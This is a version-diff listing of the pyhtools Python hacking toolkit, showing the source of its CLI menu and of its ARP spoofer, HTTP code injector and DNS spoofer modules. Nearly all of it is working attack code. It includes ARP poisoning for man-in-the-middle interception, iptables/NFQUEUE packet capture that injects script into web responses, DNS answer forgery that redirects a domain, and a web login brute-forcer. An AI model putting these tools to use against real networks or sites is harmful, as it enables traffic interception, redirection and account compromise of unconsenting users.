-        new_mac = machngr.generate_random_mac()
-
-    machngr.run_macchanger(interface, new_mac)
-
-
-# WEBSITE ATTACKS
-# TODO: Create functions for Website Attackers : getform
-def brute_login():
-    '''
-    description: bruteforce website login page.
-    params: None
-    returns: None
-    '''
-    target_url = input('[+] TARGET URL : ')
-    wordlist_file = input('[+] WORDLIST PATH : ')
-    print(BRIGHT_YELLOW +
-          '[!] Enter string in post values, eg. {"username":"admin", "password":"", "Login":"submit"} (inspect element in your webbrowser)')
-    post_data = input('[+] POST VALUES : ').strip()
-    post_values = json.loads(post_data)
-
-    web_login.bruteforce_login(target_url, wordlist_file, post_values)
-
-
-def webvulnscan():
-    '''
-    description: scans for vulnerabilities in the website
-    params: None
-    returns: None
-    '''
-    target_url = input('[+] TARGET URL : ')
-
-    print(BRIGHT_YELLOW +
-          '[!] Enter links to be ignored separated by commas(,)')
-    ignore_links = input('[+] IGNORE LINKS : ')
-
-    ignore_links = [link.strip() for link in ignore_links.split(',')]
-
-    vuln_scanner = Scanner(target_url, ignore_links)
-
-    auth_required = input(
-        '[+] AUTH REQUIRED? (y/n) (default=n): ').lower().strip()
-    login_link = ''
-    login_post_values = ''
-    if auth_required == 'y':
-        login_link = input('[+] LOGIN LINK : ')
-        print(BRIGHT_YELLOW +
-              "[!] Enter login post values, eg: {'username':'yourusername', 'password':'yourpassword', 'login':'submit'}")
-        print(BRIGHT_WHITE +
-              '[!] Inspect element in webbrowser to extract values, they might vary for every website.')
-        login_post_values = input('[+] LOGIN POST VALUES : ')
-        login_post_values = json.loads(login_post_values)
-
-        vuln_scanner.session.post(login_link, data=login_post_values)
-
-    vuln_scanner.run()
-
-
-async def webspider():
-    '''
-    description: maps all the links related to the root url
-    params: None
-    returns: None
-    '''
-    target_url = input('[+] TARGET URL : ')
-    spider = Spider()
-
-    print(f'{BRIGHT_YELLOW}[*] Starting Spider... Press Ctrl+C to interrupt')
-    discovered_links = await spider.start(
-        target_url=target_url,
-        print_links=True
-    )
-    print(f'[*] Total Links Found: {len(discovered_links)}')
-
-
-async def webcrawldirs():
-    '''
-    description: find valid directories of the website using a wordlist
-    params: None
-    returns: None
-    '''
-    domain = input('[+] DOMAIN (duckduckgo.com): ')
-    wordlist_path = input('[+] WORDLIST PATH: ')
-    await discoverer.check_dirs(domain=domain, wordlist_path=wordlist_path)
-
-
-async def webcrawlsubdom():
-    '''
-    description: find valid subdomains of the website using a wordlist
-    params: None
-    returns: None
-    '''
-    domain = input('[+] DOMAIN (duckduckgo.com) : ')
-    wordlist_path = input('[+] WORDLIST PATH : ')
-    await discoverer.check_subdomains(domain=domain, wordlist_path=wordlist_path)
+from asyncio import run
+from pyhtools.UI.colors import BRIGHT_YELLOW, BRIGHT_WHITE
+from pyhtools.attackers.web.vuln_scanner.scanner import Scanner
+from pyhtools.attackers.web.spider import Spider
+from pyhtools.attackers.web.enumerate import Discoverer
+
+
+import json
+import pyhtools.attackers.Network.arpspoofer as arp
+import pyhtools.attackers.Network.nwscan as nwscan
+import pyhtools.attackers.Network.machngr as machngr
+import pyhtools.attackers.web.login_guesser as web_login
+
+
+# Use args/kwargs to rate limit requests
+discoverer = Discoverer()
+
+# NETWORK ATTACKS
+# TODO: Create functions for Network Attackers : codeinjector, dnsspoofer, download replacer, packet_sniffer.
+def arpspoofer():
+    '''
+    description: perform arp poisoning attack.
+    params: None
+    returns: None
+    '''
+    target_ip = input('[+] TARGET IP : ')
+    spoof_ip = input('[+] SPOOF IP : ')
+    perform_mitm = input('[+] Perform MITM attack (y/n)(default=y): ').lower()
+    if perform_mitm == 'n':
+        perform_mitm = False
+    else:
+        perform_mitm = True
+    arp.run_spoofer(target_ip, spoof_ip, perform_mitm)
+
+
+def nw_scan():
+    '''
+    description: perform network scan.
+    params: None
+    returns: None
+    '''
+    ip_range = input('[+] IP (192.168.10.1/24): ')
+    nwscan.run_nwscan(ip_range)
+
+
+def mac_changer():
+    '''
+    description: changes mac of network interface.
+    params: None
+    returns: None
+    '''
+    interface = input('[+] Interface : ')
+    print(BRIGHT_YELLOW +
+          '[!] To generate random mac enter "random" (without quotes)')
+    new_mac = input('[+] New Mac : ')
+    if new_mac == 'random':
+        print(BRIGHT_WHITE + '[*] Generating Random Mac')
+        new_mac = machngr.generate_random_mac()
+
+    machngr.run_macchanger(interface, new_mac)
+
+
+# WEBSITE ATTACKS
+# TODO: Create functions for Website Attackers : getform
+def brute_login():
+    '''
+    description: bruteforce website login page.
+    params: None
+    returns: None
+    '''
+    target_url = input('[+] TARGET URL : ')
+    wordlist_file = input('[+] WORDLIST PATH : ')
+    print(BRIGHT_YELLOW +
+          '[!] Enter string in post values, eg. {"username":"admin", "password":"", "Login":"submit"} (inspect element in your webbrowser)')
+    post_data = input('[+] POST VALUES : ').strip()
+    post_values = json.loads(post_data)
+
+    web_login.bruteforce_login(target_url, wordlist_file, post_values)
+
+
+def webvulnscan():
+    '''
+    description: scans for vulnerabilities in the website
+    params: None
+    returns: None
+    '''
+    target_url = input('[+] TARGET URL : ')
+
+    print(BRIGHT_YELLOW +
+          '[!] Enter links to be ignored separated by commas(,)')
+    ignore_links = input('[+] IGNORE LINKS : ')
+
+    ignore_links = [link.strip() for link in ignore_links.split(',')]
+
+    vuln_scanner = Scanner(target_url, ignore_links)
+
+    auth_required = input(
+        '[+] AUTH REQUIRED? (y/n) (default=n): ').lower().strip()
+    login_link = ''
+    login_post_values = ''
+    if auth_required == 'y':
+        login_link = input('[+] LOGIN LINK : ')
+        print(BRIGHT_YELLOW +
+              "[!] Enter login post values, eg: {'username':'yourusername', 'password':'yourpassword', 'login':'submit'}")
+        print(BRIGHT_WHITE +
+              '[!] Inspect element in webbrowser to extract values, they might vary for every website.')
+        login_post_values = input('[+] LOGIN POST VALUES : ')
+        login_post_values = json.loads(login_post_values)
+
+        vuln_scanner.session.post(login_link, data=login_post_values)
+
+    vuln_scanner.run()
+
+
+async def webspider():
+    '''
+    description: maps all the links related to the root url
+    params: None
+    returns: None
+    '''
+    target_url = input('[+] TARGET URL : ')
+    spider = Spider()
+
+    print(f'{BRIGHT_YELLOW}[*] Starting Spider... Press Ctrl+C to interrupt')
+    discovered_links = await spider.start(
+        target_url=target_url,
+        print_links=True
+    )
+    print(f'[*] Total Links Found: {len(discovered_links)}')
+
+
+async def webcrawldirs():
+    '''
+    description: find valid directories of the website using a wordlist
+    params: None
+    returns: None
+    '''
+    domain = input('[+] DOMAIN (duckduckgo.com): ')
+    wordlist_path = input('[+] WORDLIST PATH: ')
+    await discoverer.check_dirs(domain=domain, wordlist_path=wordlist_path)
+
+
+async def webcrawlsubdom():
+    '''
+    description: find valid subdomains of the website using a wordlist
+    params: None
+    returns: None
+    '''
+    domain = input('[+] DOMAIN (duckduckgo.com) : ')
+    wordlist_path = input('[+] WORDLIST PATH : ')
+    await discoverer.check_subdomains(domain=domain, wordlist_path=wordlist_path)
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Network/arpspoofer.py` & `pyhtools-2.2.2/pyhtools/attackers/Network/arpspoofer.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,170 +1,170 @@
-# how to forward port on linux
-# execute any of the commands below
-# 1. sudo sysctl -w net.ipv4.ip_forward = 1
-# 2. sudo echo 1 > /proc/sys/net/ipv4/ip_forward
-
-
-import scapy.all as sp
-import argparse
-from time import sleep
-from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW
-from sys import exit
-
-
-def get_args():
-    '''
-    get arguments from command line.
-    '''
-    parser = argparse.ArgumentParser('ARP spoofer')
-    parser.add_argument('-t', '--target', dest='target', help='target ip')
-    parser.add_argument('-s', '--spoof', dest='spoof', help='spoof ip')
-    parser.add_argument('-mitm', '--man-in-the-middle', dest='mitm',
-                        help='switch for mitm attack option, default is 0')
-
-    args = parser.parse_args()
-
-    target_ip = args.target
-    spoof_ip = args.spoof
-    mitm = args.mitm
-    del args
-    return target_ip, spoof_ip, mitm
-
-
-def check_args(target_ip, spoof_ip):
-    '''
-    checks if arguments fetched are valid.
-    '''
-    if not target_ip:
-        exit(BRIGHT_RED +
-             "[-] Please enter target ip as argument, use -h or --help for more info")
-    elif not spoof_ip:
-        exit(BRIGHT_RED +
-             "[-] Please enter spoof ip as argument, use -h or --help for more info")
-
-    return True
-
-
-def generate_packet(pdst, hwdst, psrc):
-    '''
-    generates spoof packets.
-    '''
-    packet = sp.ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
-    return packet
-
-
-def get_mac(ip):
-    '''
-    retrieves mac address from the ip.
-    '''
-    try:
-        arp_req = sp.ARP(pdst=ip)
-        brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
-
-        packet = brdcst / arp_req
-        responded_list = sp.srp(packet, timeout=2, verbose=False, retry=3)[0]
-
-        return responded_list[0][1].hwsrc
-    except PermissionError:
-        print(BRIGHT_RED + '[-] run with sudo.')
-        exit()
-    except IndexError:
-        print(BRIGHT_YELLOW + '\r[!] Unable to find target.')
-
-
-def spoof(target_ip, spoof_ip, args_status):
-    '''
-    spoof target with spoof ip mac.
-    '''
-    if args_status:
-        target_mac = get_mac(target_ip)
-        PACKET = generate_packet(target_ip, target_mac, spoof_ip)
-        sp.send(PACKET, verbose=False)
-    else:
-        print('[-] Error while spoofing the target ' + target_ip)
-
-
-def mitm(target_ip, spoof_ip, args_status):
-    '''
-    performs man in the middle attack by arp poisoning.
-    '''
-    print(BRIGHT_YELLOW + '[+] Launching MITM ARP Attack....')
-    packets_sent = 0
-    is_attacking = True
-    while is_attacking:
-        try:
-            spoof(target_ip, spoof_ip, args_status)
-            spoof(spoof_ip, target_ip, args_status)
-            packets_sent += 2
-            print(BRIGHT_WHITE + '\r[+] Packets sent: ' +
-                  str(packets_sent), end='')
-            sleep(2)
-        except KeyboardInterrupt:
-            print(BRIGHT_YELLOW +
-                  '\r\n[+] Stopping MITM attack and restoring default settings...')
-            is_attacking = False
-
-
-def spoof_only(target_ip, spoof_ip, args_status):
-    '''
-    only spoofs the specified target.
-    '''
-    print(BRIGHT_YELLOW + f'[+] Spoofing {target_ip} as {spoof_ip}....')
-
-    packets_sent = 0
-    is_spoofing = True
-    while is_spoofing:
-        try:
-            spoof(target_ip, spoof_ip, args_status)
-            print(BRIGHT_WHITE + '\r[+] Packets sent: ' +
-                  str(packets_sent), end='')
-            packets_sent += 1
-            sleep(2)
-        except KeyboardInterrupt:
-            print(BRIGHT_YELLOW +
-                  '\r\n[+] Stopping and restoring default settings...')
-            is_spoofing = False
-
-
-def restore_default_table(dst_ip, src_ip):
-    '''
-    restore default arp table of spoofed targets.
-    '''
-    try:
-        dst_mac = get_mac(dst_ip)
-        src_mac = get_mac(src_ip)
-        packet = sp.ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
-                        psrc=src_ip, hwsrc=src_mac)
-        sp.send(packet, verbose=False, count=4)
-
-    except Exception as e:
-        print(BRIGHT_RED +
-              '[-] Exception occurred while restoring MAC address')
-        raise(e)
-
-
-def run_spoofer(target_ip, spoof_ip, perform_mitm):
-    '''
-    start spoofer.
-    '''
-    TARGET_IP, SPOOF_IP, MITM = target_ip, spoof_ip, perform_mitm
-    ARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)
-
-    if MITM == '1' or MITM:
-        print(BRIGHT_YELLOW + '[*] Performing MITM attack...')
-        mitm(TARGET_IP, SPOOF_IP, ARGS_STATUS)
-    else:
-        print(BRIGHT_YELLOW +
-              f'[*] Performing Spoof Only on {TARGET_IP} as {SPOOF_IP}...')
-        spoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)
-
-    print(BRIGHT_YELLOW +
-          '[+] Restoring default table for target and gateway....')
-    restore_default_table(TARGET_IP, SPOOF_IP)
-    restore_default_table(SPOOF_IP, TARGET_IP)
-
-    print(BRIGHT_RED + '[+] Closing ARPSPOOFER...')
-
-
-if __name__ == '__main__':
-    TARGET_IP, SPOOF_IP, MITM = get_args()
-    run_spoofer(TARGET_IP, SPOOF_IP, MITM)
+# how to forward port on linux
+# execute any of the commands below
+# 1. sudo sysctl -w net.ipv4.ip_forward = 1
+# 2. sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+import scapy.all as sp
+import argparse
+from time import sleep
+from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW
+from sys import exit
+
+
+def get_args():
+    '''
+    get arguments from command line.
+    '''
+    parser = argparse.ArgumentParser('ARP spoofer')
+    parser.add_argument('-t', '--target', dest='target', help='target ip')
+    parser.add_argument('-s', '--spoof', dest='spoof', help='spoof ip')
+    parser.add_argument('-mitm', '--man-in-the-middle', dest='mitm',
+                        help='switch for mitm attack option, default is 0')
+
+    args = parser.parse_args()
+
+    target_ip = args.target
+    spoof_ip = args.spoof
+    mitm = args.mitm
+    del args
+    return target_ip, spoof_ip, mitm
+
+
+def check_args(target_ip, spoof_ip):
+    '''
+    checks if arguments fetched are valid.
+    '''
+    if not target_ip:
+        exit(BRIGHT_RED +
+             "[-] Please enter target ip as argument, use -h or --help for more info")
+    elif not spoof_ip:
+        exit(BRIGHT_RED +
+             "[-] Please enter spoof ip as argument, use -h or --help for more info")
+
+    return True
+
+
+def generate_packet(pdst, hwdst, psrc):
+    '''
+    generates spoof packets.
+    '''
+    packet = sp.ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
+    return packet
+
+
+def get_mac(ip):
+    '''
+    retrieves mac address from the ip.
+    '''
+    try:
+        arp_req = sp.ARP(pdst=ip)
+        brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
+
+        packet = brdcst / arp_req
+        responded_list = sp.srp(packet, timeout=2, verbose=False, retry=3)[0]
+
+        return responded_list[0][1].hwsrc
+    except PermissionError:
+        print(BRIGHT_RED + '[-] run with sudo.')
+        exit()
+    except IndexError:
+        print(BRIGHT_YELLOW + '\r[!] Unable to find target.')
+
+
+def spoof(target_ip, spoof_ip, args_status):
+    '''
+    spoof target with spoof ip mac.
+    '''
+    if args_status:
+        target_mac = get_mac(target_ip)
+        PACKET = generate_packet(target_ip, target_mac, spoof_ip)
+        sp.send(PACKET, verbose=False)
+    else:
+        print('[-] Error while spoofing the target ' + target_ip)
+
+
+def mitm(target_ip, spoof_ip, args_status):
+    '''
+    performs man in the middle attack by arp poisoning.
+    '''
+    print(BRIGHT_YELLOW + '[+] Launching MITM ARP Attack....')
+    packets_sent = 0
+    is_attacking = True
+    while is_attacking:
+        try:
+            spoof(target_ip, spoof_ip, args_status)
+            spoof(spoof_ip, target_ip, args_status)
+            packets_sent += 2
+            print(BRIGHT_WHITE + '\r[+] Packets sent: ' +
+                  str(packets_sent), end='')
+            sleep(2)
+        except KeyboardInterrupt:
+            print(BRIGHT_YELLOW +
+                  '\r\n[+] Stopping MITM attack and restoring default settings...')
+            is_attacking = False
+
+
+def spoof_only(target_ip, spoof_ip, args_status):
+    '''
+    only spoofs the specified target.
+    '''
+    print(BRIGHT_YELLOW + f'[+] Spoofing {target_ip} as {spoof_ip}....')
+
+    packets_sent = 0
+    is_spoofing = True
+    while is_spoofing:
+        try:
+            spoof(target_ip, spoof_ip, args_status)
+            print(BRIGHT_WHITE + '\r[+] Packets sent: ' +
+                  str(packets_sent), end='')
+            packets_sent += 1
+            sleep(2)
+        except KeyboardInterrupt:
+            print(BRIGHT_YELLOW +
+                  '\r\n[+] Stopping and restoring default settings...')
+            is_spoofing = False
+
+
+def restore_default_table(dst_ip, src_ip):
+    '''
+    restore default arp table of spoofed targets.
+    '''
+    try:
+        dst_mac = get_mac(dst_ip)
+        src_mac = get_mac(src_ip)
+        packet = sp.ARP(op=2, pdst=dst_ip, hwdst=dst_mac,
+                        psrc=src_ip, hwsrc=src_mac)
+        sp.send(packet, verbose=False, count=4)
+
+    except Exception as e:
+        print(BRIGHT_RED +
+              '[-] Exception occurred while restoring MAC address')
+        raise(e)
+
+
+def run_spoofer(target_ip, spoof_ip, perform_mitm):
+    '''
+    start spoofer.
+    '''
+    TARGET_IP, SPOOF_IP, MITM = target_ip, spoof_ip, perform_mitm
+    ARGS_STATUS = check_args(TARGET_IP, SPOOF_IP)
+
+    if MITM == '1' or MITM:
+        print(BRIGHT_YELLOW + '[*] Performing MITM attack...')
+        mitm(TARGET_IP, SPOOF_IP, ARGS_STATUS)
+    else:
+        print(BRIGHT_YELLOW +
+              f'[*] Performing Spoof Only on {TARGET_IP} as {SPOOF_IP}...')
+        spoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)
+
+    print(BRIGHT_YELLOW +
+          '[+] Restoring default table for target and gateway....')
+    restore_default_table(TARGET_IP, SPOOF_IP)
+    restore_default_table(SPOOF_IP, TARGET_IP)
+
+    print(BRIGHT_RED + '[+] Closing ARPSPOOFER...')
+
+
+if __name__ == '__main__':
+    TARGET_IP, SPOOF_IP, MITM = get_args()
+    run_spoofer(TARGET_IP, SPOOF_IP, MITM)
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Network/code_injector.py` & `pyhtools-2.2.2/pyhtools/attackers/Network/code_injector.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,132 +1,132 @@
-#########################################################################
-# Author : Dhrumil Mistry
-#########################################################################
-
-
-#########################################################################
-# If you encounter Import error after installing netfilter use command 
-# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
-#########################################################################
-
-from subprocess import call
-import netfilterqueue
-import scapy.all as scapy
-from re import search, sub
-from pyhtools.UI.colors import *
-
-
-############################### Functions ############################### 
-def forward_packets():
-    '''
-    configures the mitm for incoming request packets
-    into a queue.
-    '''
-
-    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
-    # for local host
-    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
-    
-
-
-def reset_config():
-    '''
-    resets the configurations changed while exectution of the program to 
-    its original configuration.
-    '''
-    call('sudo iptables --flush', shell=True)
-
-
-def set_load(packet, load):
-    '''
-    sets the packet raw layer load value to the passed load value
-    '''
-    packet[scapy.Raw].load = load
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-
-    return packet
-
-
-def process_packet(packet):
-    '''
-    process received packet, everytime a packet is received and
-
-    '''
-    global inj_code
-    scapy_pkt = scapy.IP(packet.get_payload())
-    if scapy_pkt.haslayer(scapy.Raw):
-
-        load = scapy_pkt[scapy.Raw].load
-        tampered_load = b'unchanged load'
-        new_payload = b'unchanged payload'
-
-        if scapy_pkt[scapy.TCP].dport == 80:
-            print(BRIGHT_WHITE + '[*] Request Detected!')
-            tampered_load = sub(b'Accept-Encoding:.*?\\r\\n',b'', load)
-            
-
-        elif scapy_pkt[scapy.TCP].sport == 80:
-            print(BRIGHT_WHITE + '[*] Response Detected!')
-            load = load.decode('utf-8', 'ignore')
-            load = load.replace('</BODY>', '</body>')
-            if '</body>' in load:
-                print('\n[+] Script/Code Injected!!\n')
-                tampered_load = load.replace('</body>', inj_code+'</body>')
-                tampered_load = tampered_load.encode('utf-8', 'ignore')
-                print(tampered_load)
-
-                content_len_search = search("(?:Content-Length:\s)(\d*)", load)
-                if content_len_search and b'text/html' in load:
-                    content_len = content_len_search.group(1)
-                    new_content_len = int(content_len) + len(inj_code)
-
-                    tampered_load = sub(b'(?:Content-Length:\s)(\d*)', bytes(new_content_len), tampered_load)
-                print(tampered_load)
-
-
-        if load != scapy_pkt[scapy.Raw].load: 
-            if tampered_load == b'unchanged load':  
-                tampered_load = scapy_pkt[scapy.Raw].load
-            
-            new_payload = set_load(scapy_pkt, tampered_load)
-            packet.set_payload(bytes(new_payload))
-            print(new_payload.show())
-
-    packet.accept()
-    
-
-############################### Main ############################### 
-
-inj_code = '<script>alert("Payload Added!!")</script>'
-
-reset_config()
-
-print(BRIGHT_YELLOW + '[*] Starting Code injector...')
-print(BRIGHT_YELLOW + '[*] configuring packet receiver...')
-
-forward_packets()
-print(BRIGHT_YELLOW + '[*] packet receiver configured successfully.\n')
-
-print(BRIGHT_YELLOW + '[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    queue.bind(0, process_packet)
-    queue.run()
-
-except OSError as e:
-    print(BRIGHT_RED + '[-] Run script with root priviliges.')
-    print(e)
-
-except KeyboardInterrupt:
-    print(BRIGHT_RED + '\r[-] Keyboard Interrupt detected!')
-
-except Exception:
-    print(BRIGHT_RED + '[-] An Exception occurred while creating queue.\n', Exception)
-
-finally:
-    print(BRIGHT_YELLOW + '[*] Restoring previous configurations.. please be patient...')
-    reset_config()
-
-    print(BRIGHT_RED + '[-] Program stopped.')
+#########################################################################
+# Author : Dhrumil Mistry
+#########################################################################
+
+
+#########################################################################
+# If you encounter Import error after installing netfilter use command 
+# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
+#########################################################################
+
+from subprocess import call
+import netfilterqueue
+import scapy.all as scapy
+from re import search, sub
+from pyhtools.UI.colors import *
+
+
+############################### Functions ############################### 
+def forward_packets():
+    '''
+    configures the mitm for incoming request packets
+    into a queue.
+    '''
+
+    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
+    # for local host
+    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
+    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
+    
+
+
+def reset_config():
+    '''
+    resets the configurations changed while exectution of the program to 
+    its original configuration.
+    '''
+    call('sudo iptables --flush', shell=True)
+
+
+def set_load(packet, load):
+    '''
+    sets the packet raw layer load value to the passed load value
+    '''
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+
+    return packet
+
+
+def process_packet(packet):
+    '''
+    process received packet, everytime a packet is received and
+
+    '''
+    global inj_code
+    scapy_pkt = scapy.IP(packet.get_payload())
+    if scapy_pkt.haslayer(scapy.Raw):
+
+        load = scapy_pkt[scapy.Raw].load
+        tampered_load = b'unchanged load'
+        new_payload = b'unchanged payload'
+
+        if scapy_pkt[scapy.TCP].dport == 80:
+            print(BRIGHT_WHITE + '[*] Request Detected!')
+            tampered_load = sub(b'Accept-Encoding:.*?\\r\\n',b'', load)
+            
+
+        elif scapy_pkt[scapy.TCP].sport == 80:
+            print(BRIGHT_WHITE + '[*] Response Detected!')
+            load = load.decode('utf-8', 'ignore')
+            load = load.replace('</BODY>', '</body>')
+            if '</body>' in load:
+                print('\n[+] Script/Code Injected!!\n')
+                tampered_load = load.replace('</body>', inj_code+'</body>')
+                tampered_load = tampered_load.encode('utf-8', 'ignore')
+                print(tampered_load)
+
+                content_len_search = search("(?:Content-Length:\s)(\d*)", load)
+                if content_len_search and b'text/html' in load:
+                    content_len = content_len_search.group(1)
+                    new_content_len = int(content_len) + len(inj_code)
+
+                    tampered_load = sub(b'(?:Content-Length:\s)(\d*)', bytes(new_content_len), tampered_load)
+                print(tampered_load)
+
+
+        if load != scapy_pkt[scapy.Raw].load: 
+            if tampered_load == b'unchanged load':  
+                tampered_load = scapy_pkt[scapy.Raw].load
+            
+            new_payload = set_load(scapy_pkt, tampered_load)
+            packet.set_payload(bytes(new_payload))
+            print(new_payload.show())
+
+    packet.accept()
+    
+
+############################### Main ############################### 
+
+inj_code = '<script>alert("Payload Added!!")</script>'
+
+reset_config()
+
+print(BRIGHT_YELLOW + '[*] Starting Code injector...')
+print(BRIGHT_YELLOW + '[*] configuring packet receiver...')
+
+forward_packets()
+print(BRIGHT_YELLOW + '[*] packet receiver configured successfully.\n')
+
+print(BRIGHT_YELLOW + '[*] Creating Queue to start receiving packets.')
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+
+except OSError as e:
+    print(BRIGHT_RED + '[-] Run script with root priviliges.')
+    print(e)
+
+except KeyboardInterrupt:
+    print(BRIGHT_RED + '\r[-] Keyboard Interrupt detected!')
+
+except Exception:
+    print(BRIGHT_RED + '[-] An Exception occurred while creating queue.\n', Exception)
+
+finally:
+    print(BRIGHT_YELLOW + '[*] Restoring previous configurations.. please be patient...')
+    reset_config()
+
+    print(BRIGHT_RED + '[-] Program stopped.')
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/Network/dnsspoofer.py` & `pyhtools-2.2.2/pyhtools/attackers/Network/dnsspoofer.py`

 * *Ordering differences only*

 * *Files 18% similar despite different names*

```diff
@@ -1,112 +1,112 @@
-#!usr/bin/env python
-
-#########################################################################
-# Author : Dhrumil Mistry
-#########################################################################
-
-
-#########################################################################
-# If you encounter Import error after installing netfilter use command 
-# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
-#########################################################################
-
-
-from subprocess import call
-import netfilterqueue
-import scapy.all as scapy
-
-
-SPOOF_WEBSITE = b'www.bing.com'
-SPOOF_RDATA = b'10.0.2.15'
-
-############################### Functions ############################### 
-def forward_packets():
-    '''
-    configures the mitm for incoming request packets
-    into a queue.
-    '''
-
-    # executing the following command
-    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
-    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
-    # -I -> insert (packet into a chain specified by the user)
-    # -j -> jump if the packet matches the target.
-    # --queue-num -> jump to specfic queue number
-    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
-
-    # for local host
-    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
-
-
-
-def reset_config():
-    '''
-    resets the configurations changed while exectution of the program to 
-    its original configuration.
-    '''
-    call('sudo iptables --flush', shell=True)
-
-
-
-def process_packet(packet):
-    '''
-    process received packet, everytime a packet is received.
-    prints the packet received in the queue and it changes 
-    the DNS response dest ip with your desired ip.
-    '''
-    scapy_pkt = scapy.IP(packet.get_payload())
-
-    # Check for DNS layer in DNS Request Record (DNSRR) or 
-    # DNS Question Record (DNSQR)
-    if scapy_pkt.haslayer(scapy.DNSRR):
-        qname = scapy_pkt[scapy.DNSQR].qname
-        if SPOOF_WEBSITE in qname:
-            print('[*] Spoofing target ...')
-            response = scapy.DNSRR(rrname=qname, rdata=SPOOF_RDATA)
-            scapy_pkt[scapy.DNS].an = response
-            scapy_pkt[scapy.DNS].ancount = 1
-
-            # remove IP.len,IP.chksum,UDP.len,UDP.chksum to make
-            # sure that our packet looks untampered and scapy will
-            # calculate it again for us.
-            del scapy_pkt[scapy.IP].len
-            del scapy_pkt[scapy.IP].chksum
-            del scapy_pkt[scapy.UDP].len
-            del scapy_pkt[scapy.UDP].chksum
-
-            packet.set_payload(bytes(scapy_pkt))
-            print(packet)
-
-    packet.accept()
-
-
-############################### Main ############################### 
-
-print('[*] configuring packet receiver...')
-
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
-
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
-
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
-
-except KeyboardInterrupt:
-    print('\r[-] Keyboard Interrupt detected!')
-
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
-
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
-
-    print('[-] Program stopped.')
+#!usr/bin/env python
+
+#########################################################################
+# Author : Dhrumil Mistry
+#########################################################################
+
+
+#########################################################################
+# If you encounter Import error after installing netfilter use command 
+# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
+#########################################################################
+
+
+from subprocess import call
+import netfilterqueue
+import scapy.all as scapy
+
+
+SPOOF_WEBSITE = b'www.bing.com'
+SPOOF_RDATA = b'10.0.2.15'
+
+############################### Functions ############################### 
+def forward_packets():
+    '''
+    configures the mitm for incoming request packets
+    into a queue.
+    '''
+
+    # executing the following command
+    # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
+    # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
+    # -I -> insert (packet into a chain specified by the user)
+    # -j -> jump if the packet matches the target.
+    # --queue-num -> jump to specfic queue number
+    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
+
+    # for local host
+    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
+    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
+
+
+
+def reset_config():
+    '''
+    resets the configurations changed while exectution of the program to 
+    its original configuration.
+    '''
+    call('sudo iptables --flush', shell=True)
+
+
+
+def process_packet(packet):
+    '''
+    process received packet, everytime a packet is received.
+    prints the packet received in the queue and it changes 
+    the DNS response dest ip with your desired ip.
+    '''
+    scapy_pkt = scapy.IP(packet.get_payload())
+
+    # Check for DNS layer in DNS Request Record (DNSRR) or 
+    # DNS Question Record (DNSQR)
+    if scapy_pkt.haslayer(scapy.DNSRR):
+        qname = scapy_pkt[scapy.DNSQR].qname
+        if SPOOF_WEBSITE in qname:
+            print('[*] Spoofing target ...')
+            response = scapy.DNSRR(rrname=qname, rdata=SPOOF_RDATA)
+            scapy_pkt[scapy.DNS].an = response
+            scapy_pkt[scapy.DNS].ancount = 1
+
+            # remove IP.len,IP.chksum,UDP.len,UDP.chksum to make
+            # sure that our packet looks untampered and scapy will
+            # calculate it again for us.
+            del scapy_pkt[scapy.IP].len
+            del scapy_pkt[scapy.IP].chksum
+            del scapy_pkt[scapy.UDP].len
+            del scapy_pkt[scapy.UDP].chksum
+
+            packet.set_payload(bytes(scapy_pkt))
+            print(packet)
+
+    packet.accept()
